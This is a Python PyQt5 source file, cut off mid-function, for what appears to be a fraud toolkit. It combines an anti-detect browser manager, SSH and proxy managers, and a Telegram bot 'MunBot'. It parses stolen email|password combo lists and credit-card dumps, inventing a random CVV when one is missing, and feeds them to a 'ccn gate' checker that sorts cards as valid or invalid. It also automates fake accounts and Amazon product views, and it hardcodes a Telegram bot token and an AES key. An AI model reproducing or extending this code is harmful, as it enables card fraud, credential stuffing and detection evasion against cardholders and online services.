#!/usr/bin/python
# -*- coding: utf-8 -*-
from asyncio import proactor_events
import socket, sys, os, re, random, time, datetime, queue
from tkinter import E
from PyQt5 import uic, QtGui, QtCore, QtWidgets
import sqlite3 as lite
# from aescipher import AESCipher
import multiprocessing, socks
from PyQt5.QtCore import QThread, pyqtSignal
from html.parser import HTMLParser
import json, hwid
import signal
import sys
if sys.version_info[0] >= 3:
	unicode = str
import threading, openssh, emailcheck, geoip2.database, sshsocks_manager, PyQt5
from aescipher import AESCipher
import munantiapi, mybrowser
import addaccount, addemails, profileaddaccount, emailsinguplist
from functools import partial
from antidetectmain import Ui_Antidectect
from checkSiteUI import Ui_Form
from sshUI import Ui_sshForm
from sshSetupUI import Ui_Dialogssh
from munproxiesmain import Ui_Munproxiesmain
from PyQt5.QtWidgets import QMessageBox
import logging.config
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5.QtCore import *
from PyQt5 import QtGui, QtCore
from PyQt5.QtSql import *
import amazon, telebot, requests, pathlib, functools, shutil
import subprocess, munproxy, psutil, munemail
from tqdm.auto import tqdm
from pathlib import Path
from telebot import types
import MunAntiUpdate
os.environ["QT_AUTO_SCREEN_SCALE_FACTOR"] = "1"
if hasattr(QtCore.Qt, 'AA_EnableHighDpiScaling'):
    PyQt5.QtWidgets.QApplication.setAttribute(QtCore.Qt.AA_EnableHighDpiScaling, True)

if hasattr(QtCore.Qt, 'AA_UseHighDpiPixmaps'):
    PyQt5.QtWidgets.QApplication.setAttribute(QtCore.Qt.AA_UseHighDpiPixmaps, True)

logging.config.dictConfig({
    'version': 1,
    'disable_existing_loggers': True,
})
__version__ = '1.3.5'
list_tor_process = []
list_selenium_drivers = []
list_country = {'Afghanistan': 'AF', 'Aland Islands': 'AX', 'Albania': 'AL', 'Algeria': 'DZ', 'American Samoa': 'AS', 'Andorra': 'AD', 'Angola': 'AO', 'Anguilla': 'AI', 'Antarctica': 'AQ', 'Antigua and Barbuda': 'AG', 'Argentina': 'AR', 'Armenia': 'AM', 'Aruba': 'AW', 'Australia': 'AU', 'Austria': 'AT', 'Azerbaijan': 'AZ', 'Bahamas': 'BS', 'Bahrain': 'BH', 'Bangladesh': 'BD', 'Barbados': 'BB', 'Belarus': 'BY', 'Belgium': 'BE', 'Belize': 'BZ', 'Benin': 'BJ', 'Bermuda': 'BM', 'Bhutan': 'BT', 'Bolivia, Plurinational State of': 'BO', 'Bonaire, Sint Eustatius and Saba': 'BQ', 'Bosnia and Herzegovina': 'BA', 'Botswana': 'BW', 'Bouvet Island': 'BV', 'Brazil': 'BR', 'British Indian Ocean Territory': 'IO', 'Brunei Darussalam': 'BN', 'Bulgaria': 'BG', 'Burkina Faso': 'BF', 'Burundi': 'BI', 'Cambodia': 'KH', 'Cameroon': 'CM', 'Canada': 'CA', 'Cape Verde': 'CV', 'Cayman Islands': 'KY', 'Central African Republic': 'CF', 'Chad': 'TD', 'Chile': 'CL', 'China': 'CN', 'Christmas Island': 'CX', 'Cocos (Keeling) Islands': 'CC', 'Colombia': 'CO', 'Comoros': 'KM', 'Congo': 'CG', 'Congo, The Democratic Republic of the': 'CD', 'Cook Islands': 'CK', 'Costa Rica': 'CR', "Côte d'Ivoire": 'CI', 'Croatia': 'HR', 'Cuba': 'CU', 'Curaçao': 'CW', 'Cyprus': 'CY', 'Czech Republic': 'CZ', 'Denmark': 'DK', 'Djibouti': 'DJ', 'Dominica': 'DM', 'Dominican Republic': 'DO', 'Ecuador': 'EC', 'Egypt': 'EG', 'El Salvador': 'SV', 'Equatorial Guinea': 'GQ', 'Eritrea': 'ER', 'Estonia': 'EE', 'Ethiopia': 'ET', 'Falkland Islands (Malvinas)': 'FK', 'Faroe Islands': 'FO', 'Fiji': 'FJ', 'Finland': 'FI', 'France': 'FR', 'French Guiana': 'GF', 'French Polynesia': 'PF', 'French Southern Territories': 'TF', 'Gabon': 'GA', 'Gambia': 'GM', 'Georgia': 'GE', 'Germany': 'DE', 'Ghana': 'GH', 'Gibraltar': 'GI', 'Greece': 'GR', 'Greenland': 'GL', 'Grenada': 'GD', 'Guadeloupe': 'GP', 'Guam': 'GU', 'Guatemala': 'GT', 'Guernsey': 'GG', 'Guinea': 'GN', 'Guinea-Bissau': 'GW', 'Guyana': 'GY', 'Haiti': 'HT', 'Heard Island and McDonald Islands': 'HM', 'Holy See (Vatican City State)': 'VA', 'Honduras': 'HN', 'Hong Kong': 'HK', 'Hungary': 'HU', 'Iceland': 'IS', 'India': 'IN', 'Indonesia': 'ID', 'Iran, Islamic Republic of': 'IR', 'Iraq': 'IQ', 'Ireland': 'IE', 'Isle of Man': 'IM', 'Israel': 'IL', 'Italy': 'IT', 'Jamaica': 'JM', 'Japan': 'JP', 'Jersey': 'JE', 'Jordan': 'JO', 'Kazakhstan': 'KZ', 'Kenya': 'KE', 'Kiribati': 'KI', "Korea, Democratic People's Republic of": 'KP', 'Korea, Republic of': 'KR', 'Kuwait': 'KW', 'Kyrgyzstan': 'KG', "Lao People's Democratic Republic": 'LA', 'Latvia': 'LV', 'Lebanon': 'LB', 'Lesotho': 'LS', 'Liberia': 'LR', 'Libya': 'LY', 'Liechtenstein': 'LI', 'Lithuania': 'LT', 'Luxembourg': 'LU', 'Macao': 'MO', 'Macedonia, Republic of': 'MK', 'Madagascar': 'MG', 'Malawi': 'MW', 'Malaysia': 'MY', 'Maldives': 'MV', 'Mali': 'ML', 'Malta': 'MT', 'Marshall Islands': 'MH', 'Martinique': 'MQ', 'Mauritania': 'MR', 'Mauritius': 'MU', 'Mayotte': 'YT', 'Mexico': 'MX', 'Micronesia, Federated States of': 'FM', 'Moldova, Republic of': 'MD', 'Monaco': 'MC', 'Mongolia': 'MN', 'Montenegro': 'ME', 'Montserrat': 'MS', 'Morocco': 'MA', 'Mozambique': 'MZ', 'Myanmar': 'MM', 'Namibia': 'NA', 'Nauru': 'NR', 'Nepal': 'NP', 'Netherlands': 'NL', 'New Caledonia': 'NC', 'New Zealand': 'NZ', 'Nicaragua': 'NI', 'Niger': 'NE', 'Nigeria': 'NG', 'Niue': 'NU', 'Norfolk Island': 'NF', 'Northern Mariana Islands': 'MP', 'Norway': 'NO', 'Oman': 'OM', 'Pakistan': 'PK', 'Palau': 'PW', 'Palestinian Territory, Occupied': 'PS', 'Panama': 'PA', 'Papua New Guinea': 'PG', 'Paraguay': 'PY', 'Peru': 'PE', 'Philippines': 'PH', 'Pitcairn': 'PN', 'Poland': 'PL', 'Portugal': 'PT', 'Puerto Rico': 'PR', 'Qatar': 'QA', 'Réunion': 'RE', 'Romania': 'RO', 'Russian Federation': 'RU', 'Rwanda': 'RW', 'Saint Barthélemy': 'BL', 'Saint Helena, Ascension and Tristan da Cunha': 'SH', 'Saint Kitts and Nevis': 'KN', 'Saint Lucia': 'LC', 'Saint Martin (French part)': 'MF', 'Saint Pierre and Miquelon': 'PM', 'Saint Vincent and the Grenadines': 'VC', 'Samoa': 'WS', 'San Marino': 'SM', 'Sao Tome and Principe': 'ST', 'Saudi Arabia': 'SA', 'Senegal': 'SN', 'Serbia': 'RS', 'Seychelles': 'SC', 'Sierra Leone': 'SL', 'Singapore': 'SG', 'Sint Maarten (Dutch part)': 'SX', 'Slovakia': 'SK', 'Slovenia': 'SI', 'Solomon Islands': 'SB', 'Somalia': 'SO', 'South Africa': 'ZA', 'South Georgia and the South Sandwich Islands': 'GS', 'Spain': 'ES', 'Sri Lanka': 'LK', 'Sudan': 'SD', 'Suriname': 'SR', 'South Sudan': 'SS', 'Svalbard and Jan Mayen': 'SJ', 'Swaziland': 'SZ', 'Sweden': 'SE', 'Switzerland': 'CH', 'Syrian Arab Republic': 'SY', 'Taiwan, Province of China': 'TW', 'Tajikistan': 'TJ', 'Tanzania, United Republic of': 'TZ', 'Thailand': 'TH', 'Timor-Leste': 'TL', 'Togo': 'TG', 'Tokelau': 'TK', 'Tonga': 'TO', 'Trinidad and Tobago': 'TT', 'Tunisia': 'TN', 'Turkey': 'TR', 'Turkmenistan': 'TM', 'Turks and Caicos Islands': 'TC', 'Tuvalu': 'TV', 'Uganda': 'UG', 'Ukraine': 'UA', 'United Arab Emirates': 'AE', 'United Kingdom': 'GB', 'United States': 'US', 'United States Minor Outlying Islands': 'UM', 'Uruguay': 'UY', 'Uzbekistan': 'UZ', 'Vanuatu': 'VU', 'Venezuela, Bolivarian Republic of': 'VE', 'Viet Nam': 'VN', 'Virgin Islands, British': 'VG', 'Virgin Islands, U.S.': 'VI', 'Wallis and Futuna': 'WF', 'Yemen': 'YE', 'Zambia': 'ZM', 'Zimbabwe': 'ZW'}

# import pydevd, socket
# pydevd.settrace(host=socket.gethostname(),port=60126 ,suspend=False, trace_only_current_thread=True)
#############################Main
class MainWindow(QtWidgets.QMainWindow):
	finish_check_update = pyqtSignal(int, float, str, str)

	def __init__(self,setingData={}):
		super(MainWindow, self).__init__()
		self.setingData = setingData
		# print('=====',self.setingData)
		# var init
		self.lastFilePath = '';
		self.formSeting = None;
		self.loginThread = None;
		self.initUI()
		## check for update
		self.new_version = ''
		self.update_mess = ''
		self.update_link = ''
		global aes_cipher
		aes_cipher = AESCipher('stay123!@#')

		# self.hwid = self.get_id()
		# print(self.hwid)
		# self.check_update()
		# self.finish_check_update.connect(self.write_update_message)

	def initUI(self):


		self.tabbedViewWidget = QtWidgets.QTabWidget(self);

		# self.maidzocalculator = Maidzocalculator(self);
		#
		# self.maidzosite = Maidzosite(self);
		self.antidetectmain = AntiDectectMain(self);
		# self.checksite = CheckSite(self);
		self.SSH = SSH(self);
		self.MunProxies = MunProxiesMain(self);
		self.tabbedViewWidget.addTab(self.antidetectmain, QtGui.QIcon('img/post.png'), "Antidect Browsers");
		# self.tabbedViewWidget.addTab(self.checksite, QtGui.QIcon('img/post.png'), "Check site");
		self.tabbedViewWidget.addTab(self.SSH, QtGui.QIcon('img/post.png'), "SSH Manager");
		self.tabbedViewWidget.addTab(self.MunProxies, QtGui.QIcon('img/post.png'), "Mun Proxies");
		
		self.setCentralWidget(self.tabbedViewWidget);

		exitAction = QtWidgets.QAction(QtGui.QIcon('img/exit.png'), "Exit", self)
		exitAction.setShortcut('Alt+Q')
		exitAction.setStatusTip("Exit application")
		exitAction.triggered.connect(self.close)

		menubar = self.menuBar()
		# OSX dummy menu
		if sys.platform == 'darwin':
			dummyMenu = menubar.addMenu("Dummy");
			dummyMenu.addAction(exitAction);

		fileMenu = menubar.addMenu("File");
		fileMenu.addAction(exitAction);

		# toolbar
		toolbar = self.addToolBar("Toolbar");
		# open at center
		width, height = 1440, 900;
		screenRect = QtWidgets.QDesktopWidget().availableGeometry();
		x, y = (
			(screenRect.width() - screenRect.x() - width) / 2, (screenRect.height() - screenRect.y() - height) / 2);
		self.setGeometry(int(x), int(y), width, height);
		self.setWindowTitle("Tập đoàn triệu phú ^o^");
		self.setWindowIcon(QtGui.QIcon('icon.jpg'))
		self.Msgbox = QtWidgets.QMessageBox(self)

		self.show()

	def close(self):
		for p in multiprocessing.active_children():
			p.terminate();
			p.join();
		QtWidgets.QApplication.instance().quit()

class AntiDetectThread(multiprocessing.Process):
	trigger = pyqtSignal(str, str)
	def __init__(self,antidetectQueQue, statusqueue, captchaQueQue=None):
		multiprocessing.Process.__init__(self)
		# for k in kwargs.keys():
		# 	self.__setattr__(k, kwargs[k])	
			# print(k, kwargs[k])
		#self.checkmain.statusqueue.put_nowait(('uncheck', self.line_check))
		# self.antidetectmain = antidetectmain
		self.antidetectQueQue = antidetectQueQue
		self.statusqueue = statusqueue
		self.captchaQueQue = captchaQueQue
		self.mail_dup = {}
  
	def send_telegram_notify_to_group(self, group_id,msg,reply_markup=None,reply_id=None):
		#token='1235501300:AAEWPcah92B1PvsdvTCSHdT12CCg4gq-qZo'
		token = '2115090413:AAElpJP8QbX6ueHEDBlBZMLh2Fu8Zk5aIkQ'
		bot = telebot.TeleBot(token)
		send_msg = bot.send_message(group_id,'<b>'+msg+'</b>',reply_to_message_id=reply_id,reply_markup=reply_markup,parse_mode='HTML',disable_web_page_preview=False)
		return send_msg

	def edit_telegram_notify_to_group(self, chat_id,message_id,text,reply_markup=None):
		#token='1235501300:AAEWPcah92B1PvsdvTCSHdT12CCg4gq-qZo'
		token = '2115090413:AAElpJP8QbX6ueHEDBlBZMLh2Fu8Zk5aIkQ'
		bot = telebot.TeleBot(token)
		edited_msg = bot.edit_message_text(chat_id=chat_id, message_id=message_id,
							text=text, reply_markup=reply_markup, parse_mode='HTML')
		return edited_msg

	def download_file(self, url, local_filename):
		# local_filename = url.split('/')[-1]

		r = requests.get(url, stream=True, allow_redirects=True)
		if r.status_code != 200:
			r.raise_for_status()  # Will only raise for 4xx codes, so...
			raise RuntimeError(f"Request to {url} returned status code {r.status_code}")
		file_size = int(r.headers.get('Content-Length', 0))

		path = pathlib.Path(local_filename).expanduser().resolve()
		path.parent.mkdir(parents=True, exist_ok=True)

		desc = "(Unknown total file size)" if file_size == 0 else ""
		r.raw.read = functools.partial(r.raw.read, decode_content=True)  # Decompress if needed
		with tqdm.wrapattr(r.raw, "read", total=file_size, desc=desc) as r_raw:
			with path.open("wb") as f:
				shutil.copyfileobj(r_raw, f)
		return path   


	def download_file_from_telegram(self, fileInfo):
		token = '2115090413:AAElpJP8QbX6ueHEDBlBZMLh2Fu8Zk5aIkQ'
		bot = telebot.TeleBot(token)
		file_info = bot.get_file(fileInfo['file_id'])
		# print('===file_info===',file_info)
		file_url = 'https://api.telegram.org/file/bot{0}/{1}'.format(token, file_info.file_path)
		file_path = self.download_file(file_url, fileInfo['file_unique_id'])
		return file_path

	def create_checker_markup(self,checker_id,valid=0,invalid=0, unknown=0, listing_type='',page=0):
		
		markup = types.InlineKeyboardMarkup()
		callback_valid = '%s|%s|%s' % ('get_valid', checker_id, listing_type)
		callback_invalid = '%s|%s|%s' % ('get_invalid', checker_id, listing_type)
		callback_unknown = '%s|%s|%s' % ('get_unknown', checker_id, listing_type)
		inline_keyboard_valid = types.InlineKeyboardButton('Valid: %s' % (valid) , callback_data=str(callback_valid))
		inline_keyboard_invalid = types.InlineKeyboardButton('Invalid: %s' % (invalid), callback_data=str(callback_invalid))
		inline_keyboard_unknown = types.InlineKeyboardButton('Unknown: %s' % (unknown), callback_data=str(callback_unknown))
		markup.row(inline_keyboard_valid,inline_keyboard_invalid, inline_keyboard_unknown)
		new_markup = self.create_page_navigation_markup(markup, listing_type, checker_id)
		new_markup= self.create_checker_menu_markup(markup, listing_type, checker_id)    
		return new_markup


	def create_page_navigation_markup(self,markup, listing_type='',checker_id=''):
		callback_data_firstpage = '%s|%s|%s' % ('first_page', checker_id, listing_type)#{'action': 'set_page', 'value': 0, 'type':listing_type}    
		inline_keyboard_first_page = types.InlineKeyboardButton('First Page \U0001F51D', callback_data=str(callback_data_firstpage))
			
		callback_data_back_page = '%s|%s|%s' % ('back_page', checker_id, listing_type)#{'action': 'set_page', 'value': backPage, 'type':listing_type}   
		inline_keyboard_back_page = types.InlineKeyboardButton('Back \U00002B05', callback_data=str(callback_data_back_page))
		
		
		callback_data_next_page = '%s|%s|%s' % ('next_page', checker_id, listing_type)#{'action': 'set_page', 'value': nextPage, 'type':listing_type} 
		inline_keyboard_next_page = types.InlineKeyboardButton('Next \U000027A1', callback_data=str(callback_data_next_page))
		
		
		callback_data_last_page = '%s|%s|%s' % ('last_page', checker_id, listing_type)#{'action': 'set_page', 'value': lastPage, 'type':listing_type}
		inline_keyboard_last_page = types.InlineKeyboardButton('Last Page \U0001F51A', callback_data=str(callback_data_last_page))
		markup.row(inline_keyboard_first_page,inline_keyboard_back_page,inline_keyboard_next_page,inline_keyboard_last_page)
		return markup
		
	def create_checker_menu_markup(self, markup, listing_type='',checker_id=''):	
		callback_data_stop = '%s|%s|%s' % ('stop', checker_id, listing_type)
		inline_keyboard_menu = types.InlineKeyboardButton('Stop \U0001F6AB', callback_data=str(callback_data_stop))
		
		callback_data_refresh = '%s|%s|%s' % ('recheck', checker_id, listing_type)#{'action': 'set_page', 'value': 'refresh', 'type':listing_type} 

		inline_keyboard_refesh = types.InlineKeyboardButton('ReCheck \U0001F504', callback_data=str(callback_data_refresh))
		inline_keyboard_deposit = types.InlineKeyboardButton('Deposit \U0001F4B3', callback_data='deposit')
		markup.row(inline_keyboard_menu, inline_keyboard_refesh, inline_keyboard_deposit)
		return markup   

	def create_listing_markup(listing,type,page=0):

		markup = types.InlineKeyboardMarkup()

		for line in listing:
			inline_keyboard_account = types.InlineKeyboardButton(line['account'], callback_data='view|%s' %(line['id']))
			inline_keyboard_buy = types.InlineKeyboardButton('$%s \U0001F6D2' % (line['price']), callback_data='buy|%s' %(line['id']))
			markup.row(inline_keyboard_account,inline_keyboard_buy)
		inline_keyboard_first_page = types.InlineKeyboardButton('First Page \U0001F51D', callback_data='first_page')
		inline_keyboard_back_page = types.InlineKeyboardButton('Back \U00002B05', callback_data='back|%s' % (page-1))
		inline_keyboard_next_page = types.InlineKeyboardButton('Next \U000027A1', callback_data='next|%s' % (page+1))
		inline_keyboard_last_page = types.InlineKeyboardButton('Last Page \U0001F51A', callback_data='last_page')
		markup.row(inline_keyboard_first_page,inline_keyboard_back_page,inline_keyboard_next_page,inline_keyboard_last_page)

		inline_keyboard_menu = types.InlineKeyboardButton('Menu \U0001F3D8', callback_data='menu')
		inline_keyboard_refesh = types.InlineKeyboardButton('Refresh \U0001F504', callback_data='refesh|%s' % (type))
		inline_keyboard_deposit = types.InlineKeyboardButton('Deposit \U0001F4B3', callback_data='deposit')
		markup.row(inline_keyboard_menu, inline_keyboard_refesh, inline_keyboard_deposit)
		return markup
  
	def create_html_show(self, type='',balance='',total='',page='',total_page='',updated='', status='', plant_text='', displaying_page='Displaying'):
		print(type, balance, total, status, plant_text, displaying_page, page, total_page, updated)
		# Checker ccn gate 2, 0 1 Checked 1/1 Left 0: 0 valid, 1 invalid.  Displaying 1 0 31-01-2023 12:53
		html_show = '''
<b>\U0001F47B MunBot %s AIO automatic \U0001F47D</b>
<b>Balance: </b> <code>$%s</code> \U0001F4B3
<b>Total: </b> <code>%s</code> \U0001F6D2
<b>Notification: </b> <b><i>%s</i></b>
%s
<pre>%s page %s of %s. Last updated @%s</pre>
		''' % (type, balance, total, status, plant_text, displaying_page, page, total_page, updated)
		return html_show

  
	def checkMobile(self):
		self.profile_os = self.profilesBrowser['profile_os']
		self.phoneSetting = False
		flatform = 'Win32'
		if self.profile_os == 'Window':
			flatform = 'Win32'
		elif self.profile_os == 'Mac OS X':
			flatform = 'MacIntel'
		elif self.profile_os == 'Linux':
			flatform = 'Linux x86_64'
		elif self.profile_os == 'Chrome OS':
			flatform = 'CrOS X86_64'
		elif self.profile_os.lower().find('iphone') != -1:
			flatform = 'iPhone'
			self.phoneSetting = True
		else:
			flatform = 'Android'
			self.phoneSetting = True
		return self.phoneSetting
	def view_products(self, account_type):

		self.driver = self.browser.setting(self.inject_info, self.profilesBrowser)
		if not self.driver:
			self.statusqueue.put(('error', "Can not get GEO IP!"))
			return
		# self.list_browsers.append(browser)
		# self.statusqueue.put( ('add_browser', browser) )
		if account_type == 'Amazon':
			amazonApi = amazon.Amazon(mun_browser=self.driver, mobile=self.checkMobile())

			time_mins = amazonApi.view_random_page()   
			self.driver.quit()
		self.statusqueue.put(
			('view_products', json.dumps(self.profilesBrowser)))
  
	def get_imap_server(self, email):
		print('==get_imap_server==')
		if re.search('@hotmail\.|@live\.|@outlook\.', email, re.IGNORECASE):
			return 'outlook.office365.com'
		if re.search('@gmail\.', email, re.IGNORECASE):
			return 'imap.gmail.com'

	def generate_email(self):
		alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
		min = 8
		max = 16
		stringimg = ''
		list_domain = ['yahoo.com', 'hotmail.com', 'oulook.com']
		mail_domain = list_domain[random.randint(0, len(list_domain) - 1)]
		for x in random.sample(alphabet, random.randint(min, max)):
			stringimg += x
		username_chuan = stringimg
		# print(checkout_form
		self.email_chuan = username_chuan + '@' + mail_domain
		return self.email_chuan
	def generate_password(self):
		alphabet = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
		min = 8
		max = 10
		stringimg = ''
		list_domain = ['yahoo.com', 'hotmail.com', 'oulook.com']
		mail_domain = list_domain[random.randint(0, len(list_domain) - 1)]
		for x in random.sample(alphabet, random.randint(min, max)):
			stringimg += x
		username_chuan = stringimg
		# print(checkout_form
		self.email_chuan = username_chuan + '@' + mail_domain
		return username_chuan
	def get_local_port(self):
		reuse_port = False
		local_port = None
		while not reuse_port:
			local_port = random.randint(1000, 60000);
			check_port = self.check_local_port(local_port)
			if check_port:
				reuse_port = True
		return local_port

	def check_local_port(self, port):
		try:
			s = socket.socket()
			s.bind(('127.0.0.1', port))
			s.close()
		except Exception as e:
			print (e)
		else:
			return True

	def check_valid_line_for_check(self, line_check):

		if line_check.find('|') != -1:
			if self.check_site.lower().find('ccn gate') != -1:
				check_line = line_check.split('|')
				i = 0
				while i < len(check_line):
					line_email = check_line[i].strip()
					if 14 < len(line_email) <= 16 and line_email.strip().isdigit():
						return True
					i += 1
				return
			else:
				check_line = line_check.split('|')
				i = 0
				while i < len(check_line):
					line_email = check_line[i].strip()
					if re.search('.+?@.+?\..+?', line_email):
						try:
							password = check_line[i + 1].strip()
						except:
							pass
						else:
							if line_email + '|' + password not in self.mail_dup:
								self.mail_dup[line_email + '|' + password] = 1
								print('==',line_email + '|' + password)
								return line_email + '|' + password
					elif re.search('(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line_email):
						try:
							username = check_line[i + 1].strip()
							password = check_line[i + 2].strip()
						except:
							pass
						else:
							if line_email + '|' + username+'|'+password not in self.mail_dup:
								self.mail_dup[line_email + '|' + username+'|'+password] = 1
								return line_email + '|' + username+'|'+password
					i += 1
				return

		else:
			return 
	def parse_account(self, line_string):
		check_line = line_string.split('|')
		i = 0
		while i < len(check_line):
			line_email = check_line[i].strip()
			if re.search('.+?@.+?\..+?', line_email):
				try:
					password = check_line[i + 1].strip()
				except:
					pass
				else:
					return {'email': line_email, 'password': password}

			i += 1	
 
	def parse_cc(self, line_string):
		list_email = line_string.replace("/", "|").split('|')
		alphabet = '0123456789012345678901234567890123456789'
		min = 4
		max = 4
		stringimg = ''
		for x in random.sample(alphabet, random.randint(min, max)):
			stringimg += x
		ccv_random = stringimg
		i = 0
		while i < len(list_email):
			line_email = list_email[i].replace('\\', '|').replace("/", "|").replace(' ', "").replace('-', "")
			if 14 < len(line_email) <= 16 and line_email.strip().isdigit():
				cardNumber = line_email.strip()
				next_string = list_email[i + 1].strip()
				if not next_string.isdigit():
					expMonth = list_email[i + 2].strip()
					if len(expMonth) == 4:
						thang1 = expMonth[:2]
						so = thang1[:1]
						expYear = expMonth[2:]
						if i + 3 > len(list_email) - 1:
							ccv = ccv_random
						else:
							ccv = list_email[i + 3].strip()
					if len(expMonth) == 2:
						thang1 = expMonth
						so = thang1[:1]
						expYear = list_email[i + 3].strip()
						if i + 4 > len(list_email) - 1:
							ccv = ccv_random
						else:
							ccv = list_email[i + 4].strip()
					if len(expMonth) == 1:
						thang1 = expMonth
						so = thang1
						expYear = list_email[i + 3].strip()
						if i + 4 > len(list_email) - 1:
							ccv = ccv_random
						else:
							ccv = list_email[i + 4].strip()
					if len(expMonth) == 6:
						thang1 = expMonth[:2]
						so = thang1[:1]
						expYear = expMonth[2:]
						if i + 3 > len(list_email) - 1:
							ccv = ccv_random
						else:
							ccv = list_email[i + 3].strip()
				else:
					expMonth = next_string
					if len(expMonth) == 4:
						thang1 = expMonth[:2]
						so = thang1[:1]
						expYear = expMonth[2:]
						if i + 2 > len(list_email) - 1:
							ccv = ccv_random
						else:
							ccv = list_email[i + 2].strip()
					if len(expMonth) == 2:
						thang1 = expMonth
						so = thang1[:1]
						expYear = list_email[i + 2].strip()
						if i + 3 > len(list_email) - 1:
							ccv = ccv_random
						else:
							ccv = list_email[i + 3].strip()
					if len(expMonth) == 1:
						thang1 = expMonth
						so = thang1
						expYear = list_email[i + 2].strip()
						if i + 3 > len(list_email) - 1:
							ccv = ccv_random
						else:
							ccv = list_email[i + 3].strip()
					if len(expMonth) == 6:
						thang1 = expMonth[:2]
						so = thang1[:1]
						expYear = expMonth[2:]
						if i + 2 > len(list_email) - 1:
							ccv = ccv_random
						else:
							ccv = list_email[i + 2].strip()
				if len(expYear) == 2:
					nam = "20" + expYear
				else:
					nam = expYear
				try:
					d = int(nam)
					hoho = int(thang1)
				except ValueError:
					pass
				else:
					if so == "0":
						thang12 = thang1[1:2]
					else:
						thang12 = thang1
					dien = int(thang12)
					if dien <= 12:
						if 2 < len(ccv) < 5:
							try:
								b = int(ccv)
							except ValueError:
								ccv = ccv_random
						else:
							ccv = ccv_random
						thang123 = thang12
						if len(thang12) == 1:
							thang = "0" + thang12
						else:
							thang = thang12
						now = datetime.datetime.now()
						while d <= now.year:
							if d == now.year and int(thang) >= now.month:
								break
							d += 3
						nam = str(d)
						if d >= 2022:
							if len(nam) == 4:
								nam1 = nam[2:]
							thangnam = thang + nam1
						return {'ccnumber': cardNumber, 'ccmonth': thang, 'ccyear': nam1, 'ccv': ccv}


	def run(self):
		self.mun_api = munantiapi.MunAntiApi()
		self.os_pid = os.getpid()
		self.browser = mybrowser.MunAntiBrowser(statusqueue=self.statusqueue, captchaQueQue=self.captchaQueQue)
		self.request_browser = mybrowser.Rqbrowser()
		self.list_pid = []
		while 1:	

			self.driver = None	
			self.data_put = self.antidetectQueQue.get()
			if 'action' in self.data_put:
				self.action = self.data_put['action']
			if 'profile_browser' in self.data_put:
				self.profilesBrowser = self.data_put['profile_browser']
			if 'inject_info' in self.data_put:
				self.inject_info = self.data_put['inject_info']
			if self.action == 'close_browser':
				data = self.data_put['data']
				# print(str(self.os_pid), str(data))
				if str(self.os_pid) == str(data):
					print('===kill', data)
					try:
						self.driver.quit()
					except:
						self.statusqueue.put(('browser_closed', json.dumps(self.browser.profileInfo)))
						self.driver = None 
				else:
					data_put = {}
					data_put['action'] = 'close_browser'
					data_put['data'] = data
					self.antidetectQueQue.put(data_put)
					time.sleep(0.5)

			elif self.action == 'create_profile':
				print('===create profile===', self.profilesBrowser)
				new_profile_info = self.mun_api.create_profile(
					profile_info=self.profilesBrowser)
				status_dict = {'success':True, 'msg':'created successfully'}
				if 'data' in new_profile_info:
					status_dict['data'] = new_profile_info['data']['id']
					self.statusqueue.put(('create_profile', json.dumps(status_dict)))
				else:
					self.statusqueue.put(('create_profile', json.dumps(new_profile_info)))
	
			elif self.action == 'open_browser':
				print('==open_browser==')
				
				self.driver = self.browser.setting(self.inject_info, self.profilesBrowser)
				if not self.driver:
					self.statusqueue.put(('error', "Can not get GEO IP!"))
				else:	
					# self.statusqueue.put( ('add_browser', self.browser) )
					self.statusqueue.put(('open_browser', json.dumps(self.profilesBrowser)))
			elif self.action == 'import_cookies_to_profile':
				print('==import_cookies_to_profile==')
				profile_id = self.data_put['profile_id']
				profile_path_cookies = self.data_put['profile_path_cookies']
				r = self.mun_api.get_profile_by_id(profile_id)
				self.profilesBrowser = r['data']

				self.driver = self.browser.setting(self.inject_info, self.profilesBrowser, pageLoad=False)
				if not self.driver:
					self.statusqueue.put(('error', "Can not get GEO IP!"))
				else:
					self.browser.set_cookies(profile_path_cookies)
					self.statusqueue.put(('open_browser', json.dumps(self.profilesBrowser)))
					self.statusqueue.put(('import_cookies_to_profile', json.dumps(self.profilesBrowser)))
			elif self.action == 'open_account_browser':
				print('==open_account_browser==')
				profile_id = self.data_put['profile_id']
				r = self.mun_api.get_profile_by_id(profile_id)
				self.profilesBrowser = r['data']

				self.driver = self.browser.setting(self.inject_info, self.profilesBrowser)
				if not self.driver:
					self.statusqueue.put(('error', "Can not get GEO IP!"))
				else:
					self.statusqueue.put(('open_browser', json.dumps(self.profilesBrowser)))
	
			elif self.action == 'create_account':
				print('==create_account==')
				new_profile_info = self.mun_api.create_profile(
					profile_info=self.profilesBrowser)
				# print(new_profile_info['data'])
				self.driver = self.browser.setting(self.inject_info, new_profile_info['data'])
				if not self.driver:
					self.statusqueue.put(('error', "Can not get GEO IP!"))
				else:
					self.statusqueue.put(
						('create_account', json.dumps(self.profilesBrowser)))
			
			elif self.action == 'view_products':
				print('==view_products==')
				account_type = self.data_put['account_type']
				data = {'account_type': account_type.lower()}
				list_checked = self.data_put['list_checked']
				if list_checked:
					for line_checked in list_checked:
						r = self.mun_api.get_profile_by_account_id(line_checked)
						self.profilesBrowser = r['data']
						if self.profilesBrowser:
							self.view_products(account_type)
				else:
					while 1:
						r = self.mun_api.get_profile_for_auto_views(data)
						self.profilesBrowser = r['data']
						if self.profilesBrowser:
							self.view_products(account_type)
						time.sleep(0.03)
	
			elif self.action == 'add_account':
				print('==add_account==')
				profile_browser = self.data_put['profile_browser']
				profile_id = self.data_put['profile_id']
				profile_name = self.data_put['profile_name'] 
				account = self.data_put['account']
				# profile_action = self.data_put['profile_action']
				print(profile_browser, profile_id, profile_name, account)
				if not profile_id.strip():
					print('==create new profile==')
					profile_browser['profile_name'] = profile_name
					new_profile_info = self.mun_api.create_profile(
						profile_info=profile_browser)
					if 'data' in new_profile_info:
						profile_id = new_profile_info['data']['id']		
				if getattr(sys, 'frozen', False):
					appFolderPath = os.path.dirname(os.path.realpath(sys.executable))
				elif __file__:
					appFolderPath = os.path.dirname(__file__)
				chrome_data_path = os.path.join(
					appFolderPath, 'chrome data/'+profile_name)
				if os.path.exists(chrome_data_path):
